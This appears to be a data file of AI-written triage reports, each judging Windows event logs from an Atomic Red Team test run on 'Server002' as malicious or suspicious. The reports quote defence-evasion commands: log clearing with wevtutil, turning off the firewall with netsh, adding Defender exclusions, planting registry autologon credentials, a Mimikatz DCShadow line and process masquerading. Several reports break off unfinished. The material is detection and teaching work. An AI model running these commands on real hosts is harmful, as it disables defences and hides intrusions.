### Assessment:

- **Malicious Intent:** The actions observed in these logs, such as clearing logs and deleting administrative shares, strongly suggest malicious activity. Such behavior is typically associated with threat actors attempting to cover their tracks after a compromise or during a lateral movement within a network.
  
- **Indicators of Compromise:**
  - Log clearing with high integrity executed via `wevtutil.exe` by `admin_test`.
  - Execution of commands to delete default administrative shares.
  - Changes in system time settings that align with other suspicious activities.

### Resolution:

- **MALICIOUS:** The logs contain indicators of a compromise with actions consistent with attempts to evade detection and potentially prepare for further malicious actions.

### Recommendations:

1. **Immediate Actions:**
   - Isolate the affected host from the network to prevent further unauthorized access or spread.
   - Conduct a detailed forensic analysis on `Server002`, focusing on disk images and memory analysis to identify potential backdoors or malware.
   - Change all administrative credentials associated with `Server002` and related systems.

2. **Long Term Measures:**
   - Implement stricter logging and monitoring policies, ensuring that log clearance actions trigger alerts.
   - Evaluate access levels for users with administrative privileges and implement the principle of least privilege.
   - Regularly update and patch systems to mitigate vulnerabilities that could be exploited by threat actors.

By following these recommendations, you can better protect against similar threats in the future."
RDP Authentication Level Override,"From analyzing the logs provided, here are the observations and assessments:

1. **Sysmon Logs Analysis:**
   - Multiple instances of `wevtutil.exe` processes being executed with the `cl` (clear) option across various logs including ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"" logs. This consistent clearing of key event logs is typically indicative of an attempt to cover tracks post-compromise or malicious activity.
   - Additionally, the execution of `cmd.exe` with a command adding a registry key related to ""Terminal Server Client"" is unusual. This can potentially indicate nefarious activity or preparation for a backdoor.
   - The consistent high integrity level under which these processes are executed also aligns with the action of a privileged user or application, raising concerns about potential privilege abuse.

2. **System Logs:**
   - `EventID 104` indicates that log files were cleared for both the `System` and the `Windows PowerShell` logs. This operation was performed by the user `admin_test`, the same account executing the `wevtutil.exe` commands.
   - The involvement of an administrative account for this sequence of events is concerning, as it hints at unauthorized log clearing by possibly someone with elevated access.

3. **Security Logs:**
   - `EventID 1102`, which corresponds to the Security log being cleared by the same user account (`admin_test`) shortly after the other logs were cleared. This activity strengthens the suspicion of an attempt to hide further actions on this system.

4. **General Observations:**
   - Given the sequence of events — rapid clearing of multiple critical logs and the modification of registry keys — it aligns with known tactics that could be associated with a compromise or maintenance of malicious persistence on the system while trying to evade detection.

**Assessment and Conclusion:**
- The sequence of events, combined with the consistent clearing of various logs and registry modifications using a privileged account, strongly aligns with behavior indicative of malicious activity.
- The high integrity level and execution context further substantiate the likelihood of insider threat activities or system compromise where the attacker has acquired administrative credentials.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected system from the network to prevent further potential compromise.
- Conduct a thorough incident response to identify any other potentially compromised systems or configurations.
- Review account and access policies to ensure adherence to the principle of least privilege and bolstered defenses against unauthorized access.
- Restore cleared logs from backups if possible for further investigation.
- Consider a comprehensive forensic analysis and potentially rebuild affected systems to ensure no remnant or active malicious processes exist."
Tamper with Windows Defender Evade Scanning -Extension,"### Detailed Analysis of the Logs

Upon reviewing the provided logs across various channels (System, Application, Windows PowerShell, Sysmon, and Security), the following observations are made:

#### 1. **Event Logs Cleared**
   - **System Log (EventID 104), Security Log (EventID 1102):** 
     - Multiple log file clear events are noted, executed by the user `admin_test`. The clearing of logs without prior notice or justification can be a significant indicator of an attempt to cover malicious activity. It is uncommon in routine operations unless during scheduled maintenance with prior notice.
     - The processes `wevtutil.exe` are used to clear logs like Microsoft-Windows-Sysmon/Operational, System, Application, Security, and Windows PowerShell.
     
#### 2. **Suspicious PowerShell Activity**
   - **Windows PowerShell Log:**
     - A PowerShell command includes the use of `Add-MpPreference -ExclusionExtension $excludedExts` to potentially exclude certain file types (e.g., "".exe"") from anti-malware scanning. This is a common tactic used by malicious actors to evade detection.

#### 3. **Process Execution Analysis (Sysmon Logs)**
   - **Sysmon Events with `wevtutil.exe`:** 
     - The use of `wevtutil.exe` with the command `cl` (clear logs) is repeated for multiple logs including Sysmon, Security, Windows PowerShell, Application, and System. This is not typical for normal system operations and raises concerns about attempts to hide activity.
   - **Other Notable Executions:**
     - Several executions of common applications like `HOSTNAME.EXE`, `whoami.exe`, `MicrosoftEdgeUpdate.exe` are seen, which in isolation are not inherently suspicious but could be reconnaissance if done excessively.

#### 4. **Edge Update Service Execution**
   - **Frequent `MicrosoftEdgeUpdate.exe` Processes:**
     - While Edge update processes are legitimate, their rapid succession and repetitive nature, often observed in Sysmon logs, needs attention to confirm they are not being leveraged for malicious updates or persistence mechanisms. In this case, they appear associated with legitimate update activities but warrant validation against expected schedules.

#### 5. **Integrity Level and User Context**
   - **Most activities are running under high integrity or system level (SYSTEM, Admin_Test)**: This suggests powerful control over the system's processes and configuration, potentially enabling privilege escalation or maintenance of unauthorized access.

### Assessment of Situation

- **Indicators of Malicious Activity:**
  - The repeated clearing of logs, especially security-relevant logs, strongly indicates malicious intent or at least an attempt to obscure actions on the host.
  - The use of PowerShell to modify Windows Defender preferences to potentially disable security measures is indicative of common malicious strategies.

### Conclusion

Based on the analysis, the logs contain activities and patterns that strongly suggest malicious intent. As such, the resolution is:

- **MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Actions:**
   - Isolate the affected host (`Server002`) from the network to prevent further propagation or data exfiltration.
   - Preserve forensic evidence by taking a disk image of the machine for further analysis without altering the current state.
   - Check for other hosts that may have been similarly affected within the network.

2. **Further Investigation:**
   - Conduct a full forensic investigation to identify the root cause and entry point.
   - Examine network logs for unexpected outbound connections from `Server002`.
   - Review user activity for `admin_test`, including any credentials' use across other systems.

3. **Remediation:**
   - Close any security configuration gaps (e.g., ensure logging cannot be easily cleared without detection).
   - Consider updating policies regarding PowerShell usage and logging configurations.
   - Train users on recognizing malicious activities and encourage reporting.

4. **Post-Incident Review:**
   - Update incident response plans based on lessons learned from this analysis.
   - Implement additional monitoring tools to detect similar activities in the future."
WMIC Tamper with Windows Defender Evade Scanning Folder,"### Detailed Analysis:

**1. Log Analysis Highlights:**

- **Clearing Event Logs:**
  - **Sysmon Log:**
    - The use of `wevtutil.exe cl` to clear logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Windows PowerShell`, and `Security`) by the user `SERVER002\admin_test`.
  - **System Log:**
    - Multiple log entries (Event ID 104) indicating that the system logs were cleared, triggered by the user `admin_test`.
  - **Security Log:**
    - Event ID 1102, indicating the Security log was cleared by `admin_test`.

- **Suspicious Process Execution:**
  - Execution of `wmic.exe` to add an exclusion path (`ATOMICREDTEAM`) through Windows Defender (`MSFT_MpPreference call Add ExclusionPath`), suggesting an attempt to bypass security or hide malicious activities.
  - Multiple instances of `wevtutil.exe` used for clearing logs indicate an attempt to cover tracks.

- **Time Change:**
  - **System Log:** Event ID 4616 marks system time changes executed by `svchost.exe`, ensuring that review of logs by time might be unreliable if synchronised to external sources.

**2. Indicators of Malicious Activity:**
- The sequence of commands using `wevtutil.exe` to clear logs is a common technique adversaries use to hide their activities after compromise.
- The `wmic.exe` command attempts to add an exclusion path in Windows Defender settings is a tactic to evade detection or facilitate further malicious activity unchecked.
- Changing system time could be used to manipulate log timestamps or disrupt time-based security mechanisms.

**3. Assessment:**
- The clearing of logs, particularly the security and system logs, indicates an attempt to hide potentially malicious activities.
- The exclusion addition in Windows Defender suggests intent to bypass security measures.
- The corroboration of suspicious activities (log clearing, security tool alteration) aligns with TTPs (Tactics, Techniques, and Procedures) commonly associated with malicious actors.

**4. Conclusion:**
- **Resolution:** **MALICIOUS**
- The combination of event log clearing, security evasion, and system manipulation strongly suggests malicious activity on the assessed Windows host.

**5. Guidance:**
- **Immediate Actions:**
  - Disconnect the affected system from the network to prevent further unauthorized activity.
  - Preserve the system’s state for forensic analysis, ensuring no new logs overwrite the existing data.
  - Notify relevant teams from IT and security for a full assessment and containment plan.

- **Further Investigation:**
  - Conduct a thorough forensic analysis to identify any additional indicators of compromise or data exfiltration.
  - Review network activity of the involved user (`admin_test`) and correlate with known threat intelligence.

- **Preventative Measures:**
  - Implement strict logging policies that are tamper-evident and regularly backed up.
  - Review and strengthen access control policies, particularly for sensitive operations like event log management and security configurations. 
  - Introduce security monitoring tools capable of detecting unauthorized log clearances and alterations to system security settings in real-time."
Disable Microsoft Defender Firewall,"Upon examining the provided Windows event logs, there are several indicators of potentially malicious activity that warrant a closer look:

1. **Log Clearing Events:**
   - **System Log Entry (EventID 104 & 1102):** Multiple logs for the ""admin_test"" account clearing logs from the System, Windows PowerShell, and Security log channels are notable. This can be seen in the following entries: 
     - System Log Entry: `""LogFileCleared"":{""SubjectUserName"":""admin_test"",...}`
     - Security Log Entry: `{""EventID"":""1102"",...}`
   - Clearing event logs can indicate an attempt to remove traces of malicious activity and is suspicious, especially if not part of routine log management.

2. **Time Change Events:**
   - **Security Log (EventID 4616):** There are time adjustments recorded:
     - `{""EventID"":""4616"",...}` with a sudden backward change in system time. Manipulating system time can be used to bypass time-based security mechanisms.

3. **Process Executions:**
   - **Sysmon Log (EventID 1):**
     - Execution of `cmd.exe` with command line `""cmd.exe"" /c netsh advfirewall set currentprofile state off` suggests disabling the firewall, which can lead to potential security breaches:
       ```json
       {""ProcessId"":""5576"",""Image"":""C:\\Windows\\System32\\cmd.exe"",...}
       ```
     - This command is particularly concerning as it reduces the host's defenses against outside attacks.

4. **Privileges:**
   - **Security Log (EventID 4672):** The admin_test account obtained elevated privileges such as `SeDebugPrivilege, SeBackupPrivilege, etc.`, which are high-level permissions often utilized in lateral movement and privilege escalation techniques:
     ```json
     {""EventID"":""4672"",...}
     ```

5. **Remote Logins:**
   - **Security Log (EventID 4624):** There are NTLM authentication logins from what appears to be a remote workstation (`WorkstationName: ""DESKTOP-3HL5B2P""` and `IpAddress: ""192.168.0.102""`) suggesting remote access, which should be verified as legitimate:
     ```json
     {""EventID"":""4624"",...}
     ```

6. **Sysmon Logs of `wevtutil.exe`:**
   - There are repeated uses of `wevtutil.exe` to clear logs which further links to suspicious activity trying to cover up tracks.

With these findings, the correct assessment would be:

### Resolution: MALICIOUS

Given the presence of suspicious log clearing activities, potentially harmful commands being executed (like disabling the firewall), time manipulation, and the use of high-privilege accounts, there is evidence of malicious activity. Immediate action should be taken to secure the system, such as:
- Isolating the host for further forensic analysis.
- Resetting relevant user credentials, especially for ""admin_test"".
- Reviewing network activity associated with the IP addresses involved.
- Monitoring for further unauthorized or suspicious activities across the network."
UACME Bypass Method 39,"After analyzing the provided event logs, several indicators of potentially malicious activity have been identified.

### Indicators of Suspicious or Malicious Activity:

1. **Event Log Clearing:**
   - **System Log:** Two instances of Event ID 104 indicate that logs for the ""System"" and ""Windows PowerShell"" channels were cleared by the user ""admin_test"" on the computer ""Server002"".
   - **Security Log:** Event ID 1102 shows the security logs were also cleared by the same user ""admin_test"".
  
   Clearing of event logs is often associated with attempts to cover tracks and is a common tactic used by attackers to hide evidence of their malicious activities.

2. **Suspicious Process Execution:**
   - **Sysmon Log:** The execution of `cmd.exe` with the command line involving paths to `AtomicRedTeam` and `uacme` raises suspicion. Specifically, the command:
     ```
     C:\Windows\system32\cmd.exe /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\uacme\39 Akagi64.exe""
     ```
     suggests potential use of known attack simulation frameworks or tools that might have been deployed for privilege escalation or testing security controls without proper authorization or notification.

3. **Usage of `wevtutil.exe`:**
   - Several events indicate the use of `wevtutil.exe` to clear different event log channels (e.g., Sysmon, Application), which corroborates the intention to delete logs as mentioned above.

### Assessment and Conclusion:
The events depicting log clearing and the command-line operations using paths to known simulation tools such as `AtomicRedTeam` and `uacme` flag potential malicious behavior. This combination suggests actions corresponding to an adversary preparing to execute or already executing unauthorized operations while attempting to erase evidence of their actions.

 The usage of simulation tools can sometimes be benign in controlled and approved environments for pen-testing or security testing purposes. However, given the combination of log clearance and the absence of any documentation or notes suggesting these were sanctioned activities, the behavior leans towards being unauthorized or malicious.

### Recommended Resolution:
- **Resolution: MALICIOUS** 

### Recommended Actions:
1. **Immediate Action:**
   - Isolate the affected machine (Server002) from the network to prevent any potential further spread of possible malicious activity.
   - Begin a detailed forensic investigation to determine the full scope of actions taken by the user ""admin_test"" and the processes spawned.

2. **Further Investigation:**
   - Review user ""admin_test"" activities and access history to determine if this individual or their credentials have been compromised.
   - Check other systems for similar suspicious behavior or patterns, considering potential lateral movement.

3. **Security Enhancements:**
   - Increase logging verbosity and employ stricter monitoring on sensitive user accounts and critical systems.
   - Re-evaluate access permissions and consider implementing more granular controls and policies that monitor and alert on such behaviors."
InstallUtil class constructor method call,"**Detailed Analysis of the Logs:**

1. **Security Log Analysis:**

   - **Event ID 1102 (Log Cleared):** The security log contains an entry indicating that logs have been cleared (Event ID 1102) by the user 'admin_test'. Log clearing is a common tactic used by attackers post-compromise to remove tracks, making this action highly suspicious, especially if it occurs without a legitimate administrative reason.
  
   - **Event ID 4616 (System Time Changed):** There are entries showing system time changes (Event ID 4616). The subject user is 'LOCAL SERVICE', which could be legitimate, but repeated or unexpected changes should be scrutinized for tampering evidence.

2. **System Log Analysis:**

   - **Event ID 104 (Log Cleared):** The system logs show entries (Event ID 104) indicating that the System and Windows PowerShell logs were also cleared by 'admin_test'. This raises alerts since multiple system logs are being cleared in a coordinated manner.

3. **Windows PowerShell Log Analysis:**

   - There are several entries involving PowerShell activities which refer to test scripts associated with 'AtomicRedTeam' and the use of 'InstallUtil.exe'. The presence of 'AtomicRedTeam' scripts is a red flag, as these scripts are used to simulate cyber attack techniques for testing defenses.

4. **Sysmon Log Analysis:**

   - **Process Creation and Execution:** Multiple Sysmon entries show the execution of 'wevtutil.exe' for clearing event logs, which matches entries seen in the Security, System, and PowerShell logs.

   - **Executing InstallUtil.exe:** The utilization of 'InstallUtil.exe' with a non-standard DLL (T1218.004.dll) indicates an attempt at using this utility for potentially malicious purposes. 'InstallUtil.exe' is a legitimate utility often used in Living off the Land Binaries (LOLBins) attacks to execute .NET assemblies.

   - **Microsoft Edge Update Processes:** There are entries showing Microsoft Edge Update processes but these are expected system operations for browser update handling.

5. **Application Log Analysis:**

   - The update processes and activities recorded in the Application log match those in Sysmon, pointing largely to normal system maintenance or updates, except noting that the service stopped entry coincides with other suspicious activities.

**Assessment:**

- **Suspicious Activities:**
  - The clearing of security, system, and PowerShell logs is highly suspicious and generally indicative of an attempt to hide activity.

Allow Executable Through Firewall Located in Non-Standard Location,"After analyzing the provided logs, I have identified several activities that warrant further attention and investigation due to their suspicious nature.

### Suspicious Activities Identified:
1. **Event Log Clearing**
   - Multiple instances of event logs being cleared using `wevtutil.exe`, as indicated in the Sysmon logs and System logs. This activity was performed by the user `SERVER002\admin_test`. Clearing event logs is often associated with an attempt to cover up malicious activity and is considered a red flag.

2. **PowerShell Execution**
   - The PowerShell log entries indicate a script was executed with command-line arguments that involve copying an executable (`AtomicTest.exe`) and modifying the firewall rules to allow its execution. This is a behavior aligned with adversary simulation and potential misuse:
     - Use of `Copy-Item` to move an executable into the user directory.
     - Use of `netsh advfirewall` to add a firewall rule enabling inbound connections for `AtomicTest.exe`.

3. **Use of Atomic Red Team Techniques**
   - The presence of `AtomicRedTeam` in the PowerShell command-line suggests testing or misuse of known adversarial tactics, techniques, and procedures (TTPs). This could be legitimate testing by security personnel or potential malicious misuse.

### Assessment:
- **Event Log Tampering:** The clearing of event logs is a highly suspicious activity. It indicates a potential attempt to obfuscate actions on the machine.
- **PowerShell Command Execution:** The execution of scripts that manipulate firewall settings and move executables are often tactics used in exploitation phases of a cyber-attack or during penetration testing exercises.
- **Lack of Authorization Evidence:** There is no evident logging indicating these activities are part of a scheduled audit or authorized pentesting activity, which increases the suspicious nature.

### Resolution:
- **Resolution: SUSPICIOUS**

### Recommendations:
1. **Immediate Investigation:** Conduct a thorough investigation to verify if these actions were authorized activities by internal security testing teams.
2. **User Validation:** Contact `SERVER002\admin_test` to determine if the user was aware and authorized the operations noted in the logs.
3. **Further Monitoring:** Implement enhanced monitoring on the user account and host `Server002`. This includes alerting for attempts to clear logs or changes in firewall rules.
4. **Security Audit:** Initiate a security audit to ensure no unauthorized access or installations occurred outside the purview of your company's security policy.

Given the potential risks associated with the identified activities, it is crucial to address these findings promptly to ascertain the security posture of the affected system."
LockBit Black - Use Registry Editor to turn on automatic logon -cmd,"Upon reviewing the Windows event logs, several indicators point to potential malicious activity. Here's a breakdown of the findings:

1. **Use of `wevtutil.exe`**: The command-line utility `wevtutil.exe` is employed multiple times with the command `cl`, which is used to clear event logs. This indicates an attempt to cover tracks, commonly associated with malicious actions. The logs for Application, System, and Security were cleared by the user `SERVER002\admin_test`, raising concerns due to the process's nature and the high integrity level at which it was executed.

2. **Registry Modifications**: Multiple registry modifications were executed using `reg.exe`. The command lines involved modifying autoadmin logon, default username, domain name, and password. These changes suggest an attempt to establish persistence or unauthorized access on the host, which is another indicator of compromise.

3. **Use of High-Integrity Processes**: Actions were performed with a high integrity level, denoting high privileges, which implies that these changes were performed under escalated privileges, making them particularly concerning.

4. **Clearing of Event Logs**: As noted, logs for various event channels (System, Security, and Windows PowerShell) were cleared almost simultaneously, which is very unusual in normal operations and another attempt to hide evidence of activities conducted on the system.

5. **Process Execution Patterns**: The execution of typical system binaries like `hostname.exe`, `whoami.exe`, and `cmd.exe` combined with the use of `reg.exe` for direct registry manipulations, further underpins the hypothesis of unauthorized or suspicious behavior.

**Assessment:**
- **Resolution**: MALICIOUS

**Next Steps:**
1. **Immediate Isolation**: Isolate the affected system to prevent further unauthorized activity or spread within the network.
2. **Forensic Analysis**: Conduct a deeper forensic analysis to gather more evidence and understand the scope and intent of the malicious activity.

These actions should be taken to mitigate the detected threat and bolster future security postures against similar attacks."
Windows HideSCAPower Group Policy Feature,"### Detailed Analysis

1. **Log Cleared Events**:
   - The `Security` log shows an Event ID of 1102 at `2024-10-24 15:54:35`, indicating that the security logs were cleared by the user `admin_test`. This action is often associated with attempts to hide malicious activity.
   - The `System` logs were cleared around the same time (Event ID 104) by the same user `admin_test`, as were the logs in the `Windows PowerShell` and `Sysmon` channels. This further reinforces the suspicion, as clearing these logs indicates an attempt to cover tracks.

2. **Use of `wevtutil`**:
   - In the `Sysmon` logs, multiple instances of `wevtutil.exe` usage are recorded during the same timeframe (Event IDs 17951 through 17967). The command line indicates it was used to clear logs for the `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security` channels. This correlates with the cleared logs observed:
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl System`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`

3. **Registry Modification**:
   - A suspicious cmd.exe process was observed modifying the Windows registry (Event ID 17979):
     - `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"" /v HideSCAPower /t REG_DWORD /d 1 /f`
     - This action can be related to hiding certain settings or options from the user, which can be a sign of malicious intent to maintain persistence or hide malicious activities.

4. **New Processes Indicating Possible Malicious Behavior**:
   - The launching of `cmd.exe` and subsequent `reg.exe` invocations (Event IDs 17981 and 17982) to modify registry settings further suggest malicious activity. Executing such commands as a high-integrity process is often associated with privilege escalation or configuration changes to maintain persistence.

5. **Potential Legitimate Activities**:
   - There are multiple entries related to `Microsoft Edge Update` under `Sysmon` and `Application` logs (Event IDs 17988 to 18002). These may appear suspicious due to the numerous instances and entries involved, but the presence of valid file paths, product names, and company affiliations suggests they might be legitimate.

### Assessment

Given the consistent pattern of behavior — clearing logs, registry modification without apparent reason, and using legitimate utilities for potentially malicious purposes — the event log entries show clear signs of malicious activity aimed at maintaining persistence and covering tracks on the host.

### Resolution

**MALICIOUS** - The logs indicate a high probability of malicious activity, including the clearing of logs to hide actions likely intended for nefarious purposes. The use of `wevtutil` to clear multiple system logs and registry modification under `cmd.exe` suggest a potential compromise.

DCShadow (Active Directory),"### Analysis of Windows Event Logs

#### Overview

A detailed investigation of the provided Windows event logs revealed suspicious activities that strongly indicate malicious behavior. Notable observations include the execution of PowerShell scripts associated with potentially dangerous commands, clearing of event logs, and the involvement of known penetration testing tools. These actions align with tactics often used in cyber intrusions.

#### Suspicious and Malicious Activities

1. **PowerShell Execution with Malicious Intent:**
   - The logs indicate the execution of a PowerShell script aimed at emulating a Domain Controller using `DCShadow`, a feature of the Mimikatz tool. The script is designed to change directory attributes using `lsadump::dcshadow` commands, representing a classic privilege escalation attempt. The command executed is:
     ```
     ""powershell.exe"" & {# starting fake DC server, as SYSTEM (required), ... lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999 ...}
     ```
   - This activity is confirmed by multiple logs, showcasing attempts to alter domain controller settings and replicate them.

2. **Event Log Clearing:**
   - Multiple instances of the `wevtutil.exe` tool being used to clear event logs (`Sysmon`, `Application`, `Security`, and `Windows PowerShell`) were observed. Specifically, Security log (EventID 1102) and System log (EventID 104) have entries indicating log clearance by the `admin_test` account, typically indicative of cover-up tactics used by attackers.

3. **Use of Penetration Testing Tools:**
   - The logs mention executions involving Mimikatz via `PsExec.exe`, another indicator of potential malicious activity as they are commonly used by attackers to extract credentials and execute remote commands under system privileges.

4. **Execution of Auxiliary Processes:**
   - Several `conhost.exe` processes were started with suspicious command-line arguments indicative of shell execution environments supporting other processes in potentially malicious activities.

5. **Integrity Level:**
   - The processes involved were running at a ""High"" integrity level, suggesting elevated privileges were used, consistent with privilege escalation activities.

#### Threat Assessment

The logs clearly show a coordinated effort to use Windows administrative tools and scripts to manipulate domain settings, indicative of an advanced and deliberate attack. The clearing of event logs further solidifies the malicious intent as it suggests efforts to erase traces of the incident.

#### Resolution

Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell,"Upon analyzing the provided Windows event logs, several indicators suggest potential malicious activity on the host, mostly associated with the use of PowerShell and suspicious command executions. Let me break down the anomalies and indicators of compromise:

1. **Suspicious PowerShell Execution**:
   - There is a PowerShell command executed setting registry values under `HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon`. The command includes setting `AutoAdminLogon`, `DefaultUserName`, `DefaultDomainName`, and `DefaultPassword`. This is highly suspicious because it automatically logs in a default user with a specified password, indicating possible efforts to set or maintain unauthorized persistent access.

2. **Event Log Clearing**:
   - Logs show entries indicating that the event logs were cleared (“EventID 1102” in the Security log and “EventID 104” in the System log). This is often done by attackers to cover their tracks after performing malicious activities.

3. **Use of Wevtutil**:
   - The repeated execution of `wevtutil.exe` for clearing logs (`wevtutil cl Microsoft-Windows-Sysmon/Operational`, etc.) and possibly for viewing logs is suspicious when contextualized with other anomalies.
   
4. **Consistent High Integrity Level**:
   - Many processes, including potentially malicious PowerShell, were executed under high integrity level, indicating they were run with elevated privileges. This is crucial when considering the ability to change registry keys and perform other administrative tasks.

5. **Privilege Escalation or Persistence Attempt**:
   - The activity around altering Winlogon registry settings hints at a potential unauthorized privilege escalation or persistence mechanism designed to maintain control over the system.

Given these anomalies, especially the combination of registry alterations, event log clearance, and elevated privilege process executions, the case points to hostile activity within the environment.

### Final Assessment
- **Resolution**: MALICIOUS

### Recommendations:
1. **Immediate Isolation**:
   - Isolate the affected host from the network to prevent further spread or impact.

2. **Incident Response**:
   - Trigger a full incident response procedure to analyze the extent of the compromise, investigate any lateral movement, and identify breach impact and source.

3. **Forensic Analysis**:
   - Conduct a forensic analysis of the system and network to uncover further malicious artifacts, trace initial attack vectors, and understand attackers' motives and movements.

4. **System Restore and Patching**:
   - Plan to rebuild or restore the system from a known good backup and ensure all systems are up-to-date with patches, focusing on addressing vulnerabilities exploited by the attacker.

5. **Security Enhancements**:
   - Harden security by enabling PowerShell logging, implementing strict permission controls, employing advanced threat detection solutions, and conducting regular audits of privileged accounts and activities.

This analysis indicates targeted malicious activity aiming to covertly compromise and maintain unauthorized access to the system."
Tamper with Windows Defender Evade Scanning -Folder,"Upon analyzing the provided logs from the Windows host ""Server002,"" several key observations and potential indicators of malicious activity are noted:

### Observations:

1. **PowerShell Logs**:
   - A PowerShell command was executed to add an exclusion path for ""C:\Temp"" using `Add-MpPreference`. This command modifies Windows Defender settings to exclude a specific folder from being scanned. Such a change could potentially be malicious if done without proper authorization, as it might be used to obscure malicious activity by avoiding antivirus detection in the specified directory.

2. **Process and Event Logs**:
   - Numerous Sysmon events show the use of `wevtutil.exe` (Windows Event Log Utility) to clear several log files, including Sysmon and Windows PowerShell logs. This activity is generally considered suspicious and can indicate an attempt to cover tracks of unauthorized actions.
   - The Security log indicates that an event (Event ID 1102) has been logged, which corresponds to ""The audit log was cleared"" by the user ""admin_test."" Log clearing can also be seen as a step to obscure actions or activities, especially in conjunction with the use of `wevtutil.exe`.

3. **Privilege Escalation**:
   - Events are recorded that indicate the account ""admin_test"" was granted privileges typically associated with administrative functions (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege`, etc.). While this user may be an actual admin user, any privilege escalation, especially combined with other suspicious activities, should be scrutinized.

4. **Time Discrepancy**:
   - There was a series of time manipulation events indicating changes in system time. This can sometimes be an indicator of attempts to manipulate timestamps in logs, potentially to align actions or obscure activity sequences.

### Assessment:

The activities revealed in the logs, particularly the PowerShell command that excludes a directory from scanning, the clearing of various event logs, and manipulation of system time, suggest behaviors that are often associated with attempts to obfuscate unauthorized access or malicious activities.

### Resolution:

- **Resolution**: **MALICIOUS** 
  - The combination of excluding directories from antivirus scanning, clearing of event logs, and privilege escalation strongly suggests an attempt to cover and execute unauthorized actions. These actions align with common tactics used during a compromise to maintain persistence, avoid detection, and cover tracks.

### Recommendations for Action:

1. **Immediate Action**
   - Isolate the affected host (Server002) from the network to prevent further potential malicious activities.
   
2. **Further Investigation**
   - Conduct a thorough forensic analysis of the host, particularly focusing on the processes and changes around the time of the PowerShell execution and event log clearing.
   
3. **Review and Audit**
   - Audit similar actions across other systems for anomalies.
   - Examine user accounts with elevated privileges to ensure they are legitimate and not compromised.

4. **Mitigation**
   - Remove unauthorized exclusions in antivirus settings and conduct a full virus scan.
   - Review and reinforce access control policies, including monitoring of administrative actions.

5. **Incident Response**
   - Engage the incident response team to handle and mitigate potential broader impact within the infrastructure.

These steps will help identify potential threats, mitigate risks, and increase the security posture of the environment."
Masquerading - cscript.exe running as notepad.exe,"Upon analyzing the provided Windows event logs, several indicators suggest potential malicious activity. Here's a breakdown of the events and why they might signify malicious behavior:

1. **Log File Clearing**:
   - In the System log, there are events with Event ID 104 indicating that log files were cleared by the user `admin_test`. The channels cleared include ""System"" and ""Windows PowerShell"". The security log itself shows an Event ID 1102, indicating that the security logs were cleared as well. Clearing event logs is a suspicious behavior often associated with attempts to cover tracks.

2. **Suspicious Command Execution**:
   - In the Sysmon log, a process with GUID `dbf410b3-512a-6716-be00-000000003900` shows `cmd.exe` being executed with the command line: `""cmd.exe"" /c copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y & cmd.exe /c %APPDATA%\notepad.exe /B`. This sequence indicates an unauthorized copy of `cscript.exe` to `notepad.exe` in a potentially writable directory and subsequent execution, which suggests an attempt to run scripts or malware under the guise of a benign process like `notepad.exe`.

3. **Use of Eventing Command Line Utility (wevtutil)**:
   - Repeated use of the `wevtutil.exe` command to clear various event logs, captured multiple times in the logs including within the Sysmon logs, reflects a method used by attackers to delete evidence of their actions.

4. **Process Integrity and User Context**:
   - Processes are executed with High Integrity Level under the user `admin_test`, which could potentially indicate that they are running with elevated privileges, allowing greater access to system resources.

5. **Behavior Matching Known Malicious Patterns**:
   - The behavior of copying and renaming legitimate executables like `cscript.exe` to `notepad.exe` in the APPDATA directory follows a known pattern of process masquerading for evading detection.

Overall, the combination of these aspects strongly indicates that malicious activities are afoot, with specific actions taken to obfuscate the attacker's presence and intentions.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- Immediate incident response is necessary. This includes isolating the affected machine from the network to prevent further compromise or data exfiltration.
- Conduct a detailed forensic investigation on `Server002` to uncover any additional signs of compromise.
- Examine other systems within the network for similar activities, as this might be part of a more extensive campaign.
- Review access logs and change passwords for `admin_test` and any other accounts potentially compromised.
- Update threat intelligence and security tools to detect similar techniques in the future."
Set-Up Proxy Server,"Based on the provided Windows event logs, here's the detailed analysis:

### Suspicious Activity:

1. **Event Log Clearing:**
   - The logs contain multiple instances where Windows event logs have been cleared. Specifically:
     - System EventID 104 indicates that the System log was cleared by ""admin_test"".
     - A similar 104 event for the Windows PowerShell channel.
     - Security EventID 1102 indicates that the Security log was cleared by the same user.
   - Log clearing is a common tactic used by malicious actors to cover their tracks and is suspicious unless there is a valid reason for it, such as routine maintenance.

2. **Command-Line Activity:**
   - Activity related to the command `cmd.exe` with a command line carrying out registry modifications: 
     `reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyServer /t REG_SZ /d ""proxy.atomic-test.com:8080"" /f`.
   - This action modifies proxy settings on the system and can be considered suspicious, especially if unauthorized. It could indicate an attempt to redirect traffic through a malicious or unauthorized proxy server.

3. **Usage of `wevtutil`:**
   - Multiple instances of `wevtutil.exe cl` indicate the clearing of event logs (System, Security, and Windows PowerShell). This reiterates the log-clearing behavior detected earlier and suggests an effort to remove forensic evidence.

4. **Privilege Escalation:**
   - There is a logon event (ID 4624) that shows a successful logon with elevated privileges (event ID 4672). The exact context of this elevation isn't suspicious unless combined with other suspicious activities like log clearing, which is the case here.

### Assessment:

The activities observed in the logs are concerning due to the following reasons:
- The clearing of logs can indicate an attempt to hide malicious actions.
- The registry modification to change proxy settings can be a method to redirect or intercept network traffic.
- The elevated privileges detected coincide with subsequent suspicious activities.

Dynamic API Resolution-Ninja-syscall,"After reviewing the provided logs, I've identified a few key events of interest that suggest potentially malicious activity:

